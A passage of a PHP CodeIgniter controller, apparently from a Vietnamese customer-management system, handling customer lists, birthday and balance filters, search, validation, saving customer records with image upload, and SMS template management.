            $arrParam['page'] = $this->uri->segment(3, 1);
            $arrParam['customer_ids'] = $this->session->userdata('customer_tmp_ids');

            $config['base_url'] = base_url() . 'customers/tmp_list_store';
            $config['total_rows'] = $this->Customer->count_item($arrParam);

            #$config['per_page'] = $arrParam['paginator']['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
            $config['per_page'] = $arrParam['paginator']['per_page'] = 500;

            $config['uri_segment'] = 3;
            $config['use_page_numbers'] = TRUE;

            $items = $this->Customer->list_item($arrParam);

            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $this->pagination->createConfig('front-end');

            $pagination = $this->pagination->create_ajax();

            $html = $this->load->view('customers/row/list', array('items' => $items), true);

            $count_list = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_index_filter'));
            $count_birthday = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_birthday_filter'));
            $count_balance = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_balance_filter'));

            $result = array('count' => $config['total_rows'], 'html_string' => $html, 'pagination' => $pagination, 'count_list' => $count_list, 'count_balance' => $count_balance, 'count_birthday' => $count_birthday);
            echo json_encode($result);
        }
    }

    function tmp_list()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);

        $data['slb_customer_type'] = $this->Customer->item_select_customer_type();

        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;

        $this->load->view("customers/tmp_list", $data);
    }


    function birthday_list_store()
    {
        $post = $this->input->post();
        #        $post['col'] = 'id';
        #        $post['order'] = 'asc';
        $arrParam = array_merge($post, $this->input->get());

        if (!empty($post)) {

            $categoryId = $this->input->post('category_id', -1);
            $category_child = $this->input->post('category_child', -1);
            # lây tên danh mục, nếu tìm kiếm theo danh mục cha
            if (isset($categoryId) && $categoryId != -1) {
                # echo 'ok';
                # $arrParam['page'] =
                $customers_table = $this->Customer->danh_muc_khach_hang_tong_hop($categoryId);
                # $category_child_total = $this->Customer->get_all_danh_muc_khach_hang('geographical_area');
                $category_child_total = $this->Customer->get_all_danh_muc_khach_hang($customers_table[0]['name']);  # lấy ra tất cả dữ liệu trong bảng danh mục
                $category_child_total = $this->Customer->sap_xep_danh_muc_theo_thu_tu($category_child_total);   # sắp xếp dữ liệu theo cha và con
                $arrParam['customers_table'] = $customers_table[0]['name'];
                $arrParam['category_child'] = $category_child;
                $arrParam['categoryId'] = $categoryId;
                $data['category_child'] = $category_child_total;
                $data['selected_category_child'] = $category_child;
                $data['category_child_ajax'] = $this->load->view('customers/categories_child_ajax', $data, true);
            }

            $key_filter = 'customer_birthday_filter';
            $_SESSION[$key_filter] = array();
            $arrParam['key_filter'] = $key_filter;
            $arrParam['paginator'] = $this->_paginator;
            $arrParam['page'] = $this->uri->segment(3, 1);
            $arrParam['of_month'] = true;
            $arrParam['scope_of_view'] = $this->_scopeOfView;
            $config['base_url'] = base_url() . 'customers/birthday_list_store';
            $config['total_rows'] = $this->Customer->count_item($arrParam);

            $config['per_page'] = $arrParam['paginator']['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
            #$config['per_page'] = $arrParam['paginator']['per_page'] = 1;

            $config['uri_segment'] = 3;
            $config['use_page_numbers'] = TRUE;

            $items = $this->Customer->list_item($arrParam);

            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $this->pagination->createConfig('front-end');

            $pagination = $this->pagination->create_ajax();

            $html = $this->load->view('customers/row/birthday', array('items' => $items), true);

            $count_list = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_index_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_tmp = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_tmp_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_balance = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_balance_filter', 'scope_of_view' => $this->_scopeOfView));

            $result = array('count' => $config['total_rows'], 'html_string' => $html, 'pagination' => $pagination, 'count_list' => $count_list, 'count_balance' => $count_balance, 'count_tmp' => $count_tmp, 'category_child' => isset($data['category_child_ajax']) ? $data['category_child_ajax'] : '');
            echo json_encode($result);
        }
    }

    function birthday()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);

        # lấy danh mục tổng hợp
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();

        # truyền vào data danh mục cha
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        # danh mục con ban đầu là rỗng
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';


        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;

        $this->load->view("customers/birthday", $data);
    }

    function balance_list_store()
    {
        $post = $this->input->post();
        #        $post['col'] = 'id';
        #        $post['order'] = 'asc';
        $arrParam = array_merge($post, $this->input->get());
        if (!empty($post)) {

            $categoryId = $this->input->post('category_id', -1);
            $category_child = $this->input->post('category_child', -1);
            # lây tên danh mục, nếu tìm kiếm theo danh mục cha
            if (isset($categoryId) && $categoryId != -1) {
                # echo 'ok';
                # $arrParam['page'] =
                $customers_table = $this->Customer->danh_muc_khach_hang_tong_hop($categoryId);
                # $category_child_total = $this->Customer->get_all_danh_muc_khach_hang('geographical_area');
                $category_child_total = $this->Customer->get_all_danh_muc_khach_hang($customers_table[0]['name']);  # lấy ra tất cả dữ liệu trong bảng danh mục
                $category_child_total = $this->Customer->sap_xep_danh_muc_theo_thu_tu($category_child_total);   # sắp xếp dữ liệu theo cha và con
                $arrParam['customers_table'] = $customers_table[0]['name'];
                $arrParam['category_child'] = $category_child;
                $arrParam['categoryId'] = $categoryId;
                $data['category_child'] = $category_child_total;
                $data['selected_category_child'] = $category_child;
                $data['category_child_ajax'] = $this->load->view('customers/categories_child_ajax', $data, true);
            }

            $key_filter = 'customer_balance_filter';
            $_SESSION[$key_filter] = array();
            $arrParam['key_filter'] = $key_filter;
            $arrParam['paginator'] = $this->_paginator;
            $arrParam['page'] = $this->uri->segment(3, 1);
            $arrParam['scope_of_view'] = $this->_scopeOfView;
            $config['base_url'] = base_url() . 'customers/balance_list_store';
            $config['total_rows'] = $this->Customer->count_item($arrParam);

            $config['per_page'] = $arrParam['paginator']['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
            #$config['per_page'] = $arrParam['paginator']['per_page'] = 1;

            $config['uri_segment'] = 3;
            $config['use_page_numbers'] = TRUE;

            $items = $this->Customer->list_item($arrParam);

            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $this->pagination->createConfig('front-end');

            $pagination = $this->pagination->create_ajax();

            $html = $this->load->view('customers/row/balance', array('items' => $items), true);

            $count_birthday = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_birthday_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_list = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_index_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_tmp = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_tmp_filter', 'scope_of_view' => $this->_scopeOfView));

            $result = array('count' => $config['total_rows'], 'html_string' => $html, 'pagination' => $pagination, 'count_birthday' => $count_birthday, 'count_list' => $count_list, 'count_tmp' => $count_tmp, 'category_child' => isset($data['category_child_ajax']) ? $data['category_child_ajax'] : '');
            echo json_encode($result);
        }
    }

    function balance()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);

        # lấy danh mục tổng hợp
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();

        # truyền vào data danh mục cha
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        # danh mục con ban đầu là rỗng
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';


        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;

        $this->load->view("customers/balance", $data);
    }

    function deletes($ids = '')
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $this->Customer->delete_customer($post['cid']);

            $response = array('flag' => 'true', 'msg' => 'Xóa thành công.');
            echo json_encode($response);
        }
    }


    #show all list customers mail or sms
    function send_all()
    {
        $config['total_rows'] = count($_SESSION['sms_tmp']);
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['base_url'] = site_url('customers/sorting_sms');
        $this->pagination->initialize($config);
        $data['pagination'] = $this->pagination->create_links();
        $data['controller_name'] = $this->_controller_name;
        $data['form_width'] = $this->get_form_width();
        $data['per_page'] = $config['per_page'];
        $data['manage_table'] = get_customer_manage_table($_SESSION['sms_tmp'], $this);
        $this->load->view("people/manage", $data);
    }

    /*
    Returns customer table data rows. This will be called with AJAX.
    */
    function search()
    {
        $this->check_action_permission('search');


        $employeeId = $this->input->post('created_by', 'all');
        $searchText = $this->input->post('search');
        $categoryId = $this->input->post('category_id', 'all');
        # lây tên danh mục, nếu tìm kiếm theo danh mục cha
        if (isset($categoryId) && $categoryId != 'all') {
            $customers_table = $this->Customer->danh_muc_khach_hang_tong_hop($categoryId);
            $category_child_total = $this->Customer->get_all_danh_muc_khach_hang($customers_table[0]['name']);  # lấy ra tất cả dữ liệu trong bảng danh mục
            $category_child_total = $this->Customer->sap_xep_danh_muc_theo_thu_tu($category_child_total);   # sắp xếp dữ liệu theo cha và con
            $category_child = array();
            if (count($category_child_total) > 0) {
                $category_child['all'] = 'Tất cả';
                foreach ($category_child_total as $key => $value) {
                    $name = str_repeat('.-*-.-*-', $value['layer']) . '||' . $value['layer'] . ',' . $value['name'];
                    $category_child[$value['id']] = $name;
                }
            }
            # data truyền ra view
            $data['category_child'] = $category_child;
            $data['selected_category_child'] = $this->input->post('category_child_id', 'all');
            $data['category_child_ajax'] = $this->load->view('customers/form-search', $data, true);
        }

        $offset = $this->input->post('offset') ? $this->input->post('offset') : 0;
        $order_col = $this->input->post('order_col') ? $this->input->post('order_col') : 'last_name';
        $order_dir = $this->input->post('order_dir') ? $this->input->post('order_dir') : 'asc';

        $customers_search_data = array('offset' => $offset, 'order_col' => $order_col, 'order_dir' => $order_dir, 'search' => $searchText);
        $this->session->set_userdata("customers_search_data", $customers_search_data);
        $per_page = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        # truyền vào tên danh mục khách hàng đang tìm kiếm để xử lý bảng
        $searchParams['customers_table'] = isset($customers_table[0]['name']) ? $customers_table[0]['name'] : null;
        $searchParams['search_text'] = $searchText;

        $searchParams['employee_id'] = $employeeId;
        $searchParams['categoryId'] = $this->input->post('category_id', 'all');
        $searchParams['selected_category_child'] = $this->input->post('category_child_id', 'all');
        $searchParams['scope_of_view'] = $this->_scopeOfView;
        # gửi thông tin tìm kiếm, lấy dữ liệu
        $search_data = $this->Customer->search($searchParams, $per_page, $offset, $order_col, $order_dir);
        $config['base_url'] = site_url('customers/search');
        $config['total_rows'] = $this->Customer->search_count_all($searchParams);
        $config['per_page'] = $per_page;

        $this->load->library('pagination');
        $this->pagination->initialize($config);
        $data['pagination'] = $this->pagination->create_links();
        $data['total_rows'] = $this->Customer->search_count_all($searchText);
        $data['manage_table'] = get_people_manage_table_data_rows($search_data, $this);

        echo json_encode(array('manage_table' => $data['manage_table'], 'pagination' => $data['pagination'], 'category_child' => isset($data['category_child_ajax']) ? $data['category_child_ajax'] : ''));
    }

    # kiểm tra trùng lặp dữ liệu báo lỗi

    function kiem_tra_truoc_khi_luu_khach_hang($id = -1)
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $id = ($post['id']) ? $post['id'] : -1;
            $flagError = false;
            /*
                     *  yêu cầu cho từng trường
                     *  Cấu trúc cho hàm callback
                     *  $table      = $array[0];
                        $field      = $array[1];
                        $id         = $array[2];
                        $id_field   = $array[3];
                        */
                        $table = 'people';
                        $field = 'Tên trường cần so sánh';
            $id = $id;  # id của khách hàng
            $id_field = 'person_id';
            /*
                        validate_unique_custom['.$table.'-'.$field.'-'.$id.'-'.$id_field.']'; nếu không tồn tại trả về false
                        is_unique['.$table.'.'.$field.']'; kiểm tra xem có tồn tại hay k
                    */
            # nếu khách hàng mới
                        if ($id == -1) {
                            $field = 'code';
                            $code = 'required|is_unique[' . $table . '.' . $field . ']';
                            $last_name = 'required|trim';
                            $field = 'phone_number';
                            $phone_number = 'trim|callback__check_phone_number|is_unique[' . $table . '.' . $field . ']';
                            $field = 'email';
                            $email = 'trim|valid_email|is_unique[' . $table . '.' . $field . ']';
                            $field = 'fax_number';
                            $fax_number = 'trim|callback__check_phone_number|is_unique[' . $table . '.' . $field . ']';
                            $account_number = 'trim|callback__check_phone_number|is_unique[' . $table . '.' . $field . ']';
            } # nếu khách hàng cũ
            else {
                $field = 'code';
                $code = 'required|callback_validate_unique_custom[' . $table . '-' . $field . '-' . $id . '-' . $id_field . ']';
                $last_name = 'required|trim';
                $field = 'phone_number';
                $phone_number = 'trim|callback__check_phone_number|callback_validate_unique_custom[' . $table . '-' . $field . '-' . $id . '-' . $id_field . ']';
                $field = 'email';
                $email = 'trim|valid_email|callback_validate_unique_custom[' . $table . '-' . $field . '-' . $id . '-' . $id_field . ']';
                $field = 'fax_number';
                $fax_number = 'trim|callback__check_phone_number';
                $field = 'account_number';
                $table = 'customers';
                $account_number = 'trim|callback_validate_unique_custom[' . $table . '-' . $field . '-' . $id . '-' . $id_field . ']';
            }

            $this->form_validation->set_rules('last_name', lang('common_last_name'), $last_name, $this->_thong_bao);
            $this->form_validation->set_rules('phone_number', lang('common_phone_number'), $phone_number, $this->_thong_bao);
            $this->form_validation->set_rules('fax_number', lang('common_fax_number'), $fax_number, $this->_thong_bao);
            $this->form_validation->set_rules('email', 'Địa chỉ email', $email, $this->_thong_bao);
            $this->form_validation->set_rules('account_number', 'Tài khoản ngân hàng', $account_number, $this->_thong_bao);
            $this->form_validation->set_rules('code', 'Mã khách hàng', $code, $this->_thong_bao);
            # echo 'k co loi';
            if ($this->form_validation->run($this) == FALSE) {
                $flagError = true;
                $errors = $this->form_validation->error_array();
                # var_dump($errors);
            }

            if ($flagError == true) {
                $response = array('success' => false, 'message' => 'Có lỗi khi nhập dữ liệu, chi tiết lỗi tại các dòng', 'flag' => false, 'errors' => $errors);
            } else {
                $response = array('flag' => true, 'action_button_value' => $this->input->post('action_button_value'));
            }
            echo json_encode($response);
        }
    }

    function _check_phone_number($str)
    {
        return (!preg_match('/^([0-9._ -]{0,})+$/', $str)) ? FALSE : TRUE;
    }

    function action_button()
    {

        var_dump($this->input->get('action_button', FALSE));
        die();
        $this->session->set_flashdata('action_button', $this->input->get('action_button', FALSE));
    }

    function check_duplicate()
    {
        echo json_encode(array(
            'duplicate' => $this->Customer->check_duplicate($this->input->post('name'), $this->input->post('email'), $this->input->post('phone_number'), $this->input->post('id')),
            'action_button' => $this->session->userdata('action_button'),
        ));
    }

    /*
    Inserts/updates a customer
    */
    function save($customer_id = -1)
    {
        // echo "<pre>";
        // var_dump($this->input->post('watcher_manager'));die();
        # $errors = $this->kiem_tra_truoc_khi_luu_khach_hang();
        $this->check_action_permission('add_update');
        # Nếu không có mã khách hàng gửi lên
        $iValid = FALSE;
        if (!$this->input->post('code')) {
            $ma_khach_hang = $this->config->item('ma_khach_hang_prefix') . ' ' . $this->config->item('ma_khach_hang_bat_dau_tu');
            $iValid = TRUE;
        }
        $first_date_registration = null;
        $last_updated_registration = null;

        $person_data = array(
            'code' => $this->input->post('code') ? trim($this->input->post('code')) : $ma_khach_hang,
            'first_name' => $this->input->post('first_name') ? htmlspecialchars(trim($this->input->post('first_name'))) : '',
            'last_name' => $this->input->post('last_name') ? htmlspecialchars(trim($this->input->post('last_name'))) : '',
            'email' => htmlspecialchars($this->input->post('email')),
            'phone_number' => htmlspecialchars($this->input->post('phone_number')),
            'fax_number' => htmlspecialchars($this->input->post('fax_number')),
            'chung_minh_thu' => htmlspecialchars($this->input->post('chung_minh_thu')),
            'ho_chieu' => htmlspecialchars($this->input->post('ho_chieu')),
            'address_1' => htmlspecialchars($this->input->post('address_1')),
            'website' => htmlspecialchars($this->input->post('website')),
            'address_2' => $this->input->post('address_2') ? htmlspecialchars($this->input->post('address_2')) : '',
            'city' => $this->input->post('city') ? htmlspecialchars($this->input->post('city')) : '',
            'state' => $this->input->post('state') ? $this->input->post('state') : '',
            'zip' => $this->input->post('zip') ? $this->input->post('zip') : '',
            'country' => $this->input->post('country') ? $this->input->post('country') : '',
            'comments' => $this->input->post('comments'),
            'birth_date' => date('Y-m-d', strtotime('now')),
            'authorized_capital' => str_replace(',', '', (string)$this->input->post('authorized_capital')),
            'total_assets' => str_replace(',', '', (string)$this->input->post('total_assets')),
            'total_revenue' => str_replace(',', '', (string)$this->input->post('total_revenue')),
            'total_profit' => str_replace(',', '', (string)$this->input->post('total_profit')),
            'first_date_registration' => $this->input->post('first_date_registration') ? date('Y-m-d', strtotime($this->input->post('first_date_registration'))) : null,
            'last_updated_registration' => $this->input->post('last_updated_registration') ? date('Y-m-d', strtotime($this->input->post('last_updated_registration'))) : null,
            'business_item' => $this->input->post('business_item') ? htmlspecialchars($this->input->post('business_item')) : '',
            'note' => $this->input->post('ghi_chu') ? htmlspecialchars($this->input->post('ghi_chu')) : '',
            'iValid' => $iValid,
        );


        $customer_data = array(
            'attribute_set_id' => $this->input->post('attribute_set_id'),
            'company_name' => $this->input->post('company_name') ? htmlspecialchars($this->input->post('company_name')) : '',
            'tier_id' => $this->input->post('tier_id') ? htmlspecialchars($this->input->post('tier_id')) : NULL,
            'account_number' => $this->input->post('account_number') == '' ? null : htmlspecialchars($this->input->post('account_number')),
            'created_by' => $this->input->post('created_by'),
            'watcher_manager' => json_encode($this->input->post('watcher_manager')),
            'taxable' => $this->input->post('taxable') == '' ? 0 : 1,
            'tax_certificate' => htmlspecialchars($this->input->post('tax_certificate')),
            'override_default_tax' => $this->input->post('override_default_tax') ? $this->input->post('override_default_tax') : 0,
            'type_customer' => $this->input->post('customer_type') ? $this->input->post('customer_type') : 0,
            'reference_by' => $this->input->post('customer_reference') ? htmlspecialchars($this->input->post('customer_reference')) : NULL,
            'position' => $this->input->post('position'),
            'sex' => $this->input->post('sex') ? $this->input->post('sex') : 1,
            'family_info' => $this->input->post('family_info'),
            'company_birth_date' => date('Y-m-d', strtotime($this->input->post('company_birth_date'))),
            'company_manage_name' => htmlspecialchars($this->input->post('company_manage_name')),
            'company_form_id' => htmlspecialchars($this->input->post('company_form_id')),
            'code_tax' => $this->input->post('code_tax'),
            'business_registration' => $this->input->post('business_registration') ? htmlspecialchars($this->input->post('business_registration')) : '',
        );


        if ($customer_id == -1) {
            $customer_data['created_by'] = $this->Employee->get_logged_in_employee_info()->person_id;
            $customer_data['created_location_id'] = $this->Employee->get_logged_in_employee_current_location_id();
        }


        if ($this->config->item('enable_customer_loyalty_system') && $this->config->item('loyalty_option') == 'advanced' && count(explode(":", $this->config->item('spend_to_point_ratio'), 2)) == 2) {
            list($spend_amount_for_points, $points_to_earn) = explode(":", $this->config->item('spend_to_point_ratio'), 2);
            $customer_data['current_spend_for_points'] = $spend_amount_for_points - $this->input->post('amount_to_spend_for_next_point');
        } elseif ($this->config->item('enable_customer_loyalty_system') && $this->config->item('loyalty_option') == 'simple') {
            $number_of_sales_for_discount = $this->config->item('number_of_sales_for_discount');
            $customer_data['current_sales_for_discount'] = $number_of_sales_for_discount - (float)$this->input->post('sales_until_discount');
        }

        if ($this->input->post('balance') !== NULL && is_numeric($this->input->post('balance'))) {
            $customer_data['balance'] = $this->input->post('balance');
        }

        if ($this->input->post('balance_2') !== NULL && is_numeric($this->input->post('balance_2'))) {
            $customer_data['balance_2'] = $this->input->post('balance_2');
        }

        if ($this->input->post('credit_limit') !== NULL && is_numeric($this->input->post('credit_limit'))) {
            $customer_data['credit_limit'] = $this->input->post('credit_limit');
        } elseif ($this->input->post('credit_limit') === '') {
            $customer_data['credit_limit'] = NULL;
        }

        if ($this->input->post('points') !== NULL && is_numeric($this->input->post('points'))) {
            $customer_data['points'] = $this->input->post('points');
        }

        $redirect_code = $this->input->post('redirect_code');
        if ($this->input->post('delete_cc_info')) {
            $customer_data['cc_token'] = NULL;
            $customer_data['cc_preview'] = NULL;
            $customer_data['card_issuer'] = NULL;
        }

        # truyền data vào để update
        if ($this->Customer->save_customer($person_data, $customer_data, $customer_id)) {
            /* Update Extended Attributes */
            $this->Appconfig->save('ma_khach_hang_bat_dau_tu', (int)$this->config->item('ma_khach_hang_bat_dau_tu') + 1);

            if (!class_exists('Attribute')) {
                $this->load->model('Attribute');
            }
            $attributes = $this->input->post('attributes');
            if (!empty($attributes)) {
                $this->Attribute->reset_attributes(array('entity_id' => $customer_id, 'entity_type' => 'customers'));
                foreach ($attributes as $attribute_id => $value) {
                    $attribute_value = array('entity_id' => $customer_id, 'entity_type' => 'customers', 'attribute_id' => $attribute_id, 'entity_value' => $value);
                    $this->Attribute->set_attributes($attribute_value);
                }
            }
            /* End Update */

            if ($this->Location->get_info_for_key('mailchimp_api_key')) {
//                $this->Person->update_mailchimp_subscriptions($this->input->post('email'), $this->input->post('first_name'), $this->input->post('last_name'), $this->input->post('mailing_lists'));
            }


            $success_message = '';

            #New customer
            if ($customer_id == -1) {
                $success_message = lang('customers_successful_adding') . ' ' . $person_data['first_name'] . ' ' . $person_data['last_name'];
                echo json_encode(array('success' => true, 'message' => $success_message, 'person_id' => $customer_data['person_id'], 'redirect_code' => $redirect_code));
                $customer_id = $customer_data['person_id'];

            } else  #previous customer
            {
                $success_message = lang('customers_successful_updating') . ' ' . $person_data['first_name'] . ' ' . $person_data['last_name'];
                $this->session->set_flashdata('manage_success_message', $success_message);
                echo json_encode(array('success' => true, 'message' => $success_message, 'person_id' => $customer_id, 'redirect_code' => $redirect_code));
            }
            # lưu thông tin liên hệ
            $thong_tin_lien_he = $this->input->post('thong_tin_lien_he') ? $this->input->post('thong_tin_lien_he') : array();
            $this->Customer->luu_thong_tin_lien_he_them($thong_tin_lien_he, $customer_id);
            $thong_tin_dau_moi = $this->input->post('thong_tin_dau_moi') ? $this->input->post('thong_tin_dau_moi') : array();
            $this->Customer->luu_thong_tin_dau_moi_them($thong_tin_dau_moi, $customer_id);
            #lưu quản lý danh mục khách hàng
            $business_type = $this->input->post('business_type') ? $this->input->post('business_type') : array();
            /*
            * table name
            */
            $table_name = 'business_type';
            $this->Customer->thay_doi_bang_danh_muc_lien_ket($table_name, $business_type, $customer_id);
            #lưu hình thức trao đổi'
            $exchange_form = $this->input->post('exchange_form') ? $this->input->post('exchange_form') : array();
            /* table name
            */
            $table_name = 'exchange_form';
            /*
            */
            $this->Customer->thay_doi_bang_danh_muc_lien_ket($table_name, $exchange_form, $customer_id);

            #lưu khu vực địa lý
            $geographical_area = $this->input->post('geographical_area') ? $this->input->post('geographical_area') : array();
            # var_dump($geographical_area);
            /* table name
            */
            $table_name = 'geographical_area';
            /*
            */


            $this->Customer->thay_doi_bang_danh_muc_lien_ket($table_name, $geographical_area, $customer_id);

            $customers_taxes_data = array();
            $tax_names = $this->input->post('tax_names');
            $tax_percents = $this->input->post('tax_percents');
            $tax_cumulatives = $this->input->post('tax_cumulatives');
            for ($k = 0; $k < count($tax_percents); $k++) {
                if (is_numeric($tax_percents[$k])) {
                    $customers_taxes_data[] = array('name' => $tax_names[$k], 'percent' => $tax_percents[$k], 'cumulative' => isset($tax_cumulatives[$k]) ? $tax_cumulatives[$k] : '0');
                }
            }
            $this->load->model('Customer_taxes');
            $this->Customer_taxes->save($customers_taxes_data, $customer_id);


            #Delete Image
            if ($this->input->post('del_image') && $customer_id != -1) {
                $customer_info = $this->Customer->get_info($customer_id);
                if ($customer_info->image_id != null) {
                    $this->Person->update_image(NULL, $customer_id);
                    $this->load->model('Appfile');
                    $this->Appfile->delete($customer_info->image_id);
                }
            }

            #Save Image File
            if (!empty($_FILES["image_id"]) && $_FILES["image_id"]["error"] == UPLOAD_ERR_OK) {

                $allowed_extensions = array('png', 'jpg', 'jpeg', 'gif');
                $extension = strtolower(pathinfo($_FILES["image_id"]["name"], PATHINFO_EXTENSION));
                if (in_array($extension, $allowed_extensions)) {
                    $config['image_library'] = 'gd2';
                    $config['source_image'] = $_FILES["image_id"]["tmp_name"];
                    $config['create_thumb'] = FALSE;
                    $config['maintain_ratio'] = TRUE;
                    $config['width'] = 400;
                    $config['height'] = 300;
                    $this->load->library('image_lib', $config);
                    $this->image_lib->resize();
                    $this->load->model('Appfile');
                    $image_file_id = $this->Appfile->save($_FILES["image_id"]["name"], file_get_contents($_FILES["image_id"]["tmp_name"]));
                }

                if ($customer_id == -1) {
                    $this->Person->update_image($image_file_id, $customer_data['person_id']);
                } else {
                    $this->Person->update_image($image_file_id, $customer_id);

                }
            }


        } else  #failure
        {
            echo json_encode(array('success' => false, 'message' => lang('customers_error_adding_updating') . ' ' .
                $person_data['first_name'] . ' ' . $person_data['last_name'], 'person_id' => -1));
        }
    }

    /*
     get the width for the add/edit form
     */

     function get_form_width()
     {
        return 750;
    }

    /**
     * SMS Brandname
     */
    function manage_sms()
    {
        # configuration for pagination
        $config['base_url'] = base_url() . 'customers/manage_sms';
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['uri_segment'] = 3;
        $config['use_page_numbers'] = TRUE;


        # Save search condition default
        $arrParamsDefault = array(
            'search_text' => '',
            'order_col' => 'id',
            'order_dir' => 'asc',
            'page' => 1,
            'per_page' => $config['per_page'],
        );
        $_SESSION['arrParamsSms'] = isset($_SESSION['arrParamsSms']) ? $_SESSION['arrParamsSms'] : $arrParamsDefault;


        $arrParams = array(
            'search_text' => isset($_POST['search']) ? $this->input->post('search') : $_SESSION['arrParamsSms']['search_text'],
            'order_col' => $this->input->post('order_col') ? $this->input->post('order_col') : $_SESSION['arrParamsSms']['order_col'],
            'order_dir' => $this->input->post('order_dir') ? $this->input->post('order_dir') : $_SESSION['arrParamsSms']['order_dir'],
            'page' => $this->uri->segment(3) ? $this->uri->segment(3) : $_SESSION['arrParamsSms']['page'],
            'per_page' => $config['per_page'],
        );

        #save search condition for reload page
        $_SESSION['arrParamsSms'] = $arrParams;

        $config['total_rows'] = $this->Customer->count_all_sms($arrParams);

        $this->pagination->initialize($config);
        $data['pagination'] = $this->pagination->my_Create_Links();

        $data['total_rows_sms_campain'] = $this->Customer->count_all_sms_campain($arrParams1 = array());
        $data['controller_name'] = $this->_controller_name;
        $data['form_width'] = $this->get_form_width();
        $data['per_page'] = $config['per_page'];
        $data['total_rows'] = $config['total_rows'];
        $data['baseUrl'] = $config['base_url'];
        $data['results'] = $this->Customer->get_all_sms_template($arrParams);
        # get if pagination is true else show the master view
        if ($this->uri->segment(4) == 't') {
            echo json_encode(array('manage_table' => $this->load->view("customers/sms_template/manage_sms_temp_table", $data, TRUE), 'pagination' => $this->load->view("customers/pagination_view", $data, TRUE), 'total_row' => $data['total_rows']));
        } else {
            $this->load->view("customers/sms_template/manage_sms", $data);
        }


    }

    function sorting_sms()
    {
        $per_page = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['total_rows'] = $this->Customer->count_all_sms();
        $table_data = $this->Customer->get_all_sms($per_page, $this->input->post('offset') ? $this->input->post('offset') : 0, $this->input->post('order_col') ? $this->input->post('order_col') : 'id', $this->input->post('order_dir') ? $this->input->post('order_dir') : 'DESC');

        $config['base_url'] = site_url('customers/sorting_sms');
        $config['per_page'] = $per_page;
        $this->pagination->initialize($config);
        $data['pagination'] = $this->pagination->create_links();
        $data['manage_table'] = get_sms_manage_table_data_rows($table_data, $this);
        $data['total_rows'] = $config['total_rows'];
        echo json_encode(array('manage_table' => $data['manage_table'], 'pagination' => $data['pagination']));
    }

    function search_sms()
    {
        $this->check_action_permission('search');
        $search = $this->input->post('search');
        $per_page = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $search_data = $this->Customer->search_sms($search, $per_page, $this->input->post('offset') ? $this->input->post('offset') : 0, $this->input->post('order_col') ? $this->input->post('order_col') : 'id', $this->input->post('order_dir') ? $this->input->post('order_dir') : 'desc');
        $config['base_url'] = site_url("customers/search_sms");
        $config['total_rows'] = $this->Customer->search_count_sms($search);
        $config['per_page'] = $per_page;
        $this->pagination->initialize($config);
        $data['pagination'] = $this->pagination->create_links();
        $data['manage_table'] = get_sms_manage_table_data_rows($search_data, $this);
        $data['total_rows'] = $config['total_rows'];
        echo json_encode(array('manage_table' => $data['manage_table'], 'pagination' => $data['pagination']));
    }

    function view_sms($id = -1, $redirect = 0)
    {
        $data['info_sms'] = $this->Customer->get_info_sms($id);
        $data['redirect'] = $redirect;
        $this->load->view("customers/sms_template/create_update_sms_template", $data);
    }

    #save sms
    function save_sms($id = -1)
    {
        $sms_data = array(
            'title' => $this->input->post('sms_title'),
            'message' => $this->input->post('sms_message'),
            'number_char' => $this->input->post('sms_num_char'),
            'number_message' => $this->input->post('sms_num_mess'),
        );
        $redirect = $this->input->post('redirect');
        $last_insert_id = $this->Customer->save_sms($sms_data, $id);
        if ($last_insert_id) {
            #save template for 'sinh nhat' 'no' mail campain
            $selectedTemp = ($id == -1) ? $last_insert_id : $id;
            $postMinutes = 00;
            $postHours = 8;
            $postDaysOfWeek = '*';
            $postMonths = '*';
            $postDays = '*';
            $chk_active = 1;
            if (!empty($this->input->post('chk_temp_for_birth')) && $this->input->post('chk_temp_for_birth') == 1) {

                $sms_campain_name_sn = 'sinh_nhat';
                $smscampain_sn = $this->Customer->get_all_sms_campain(array('name' => $sms_campain_name_sn));
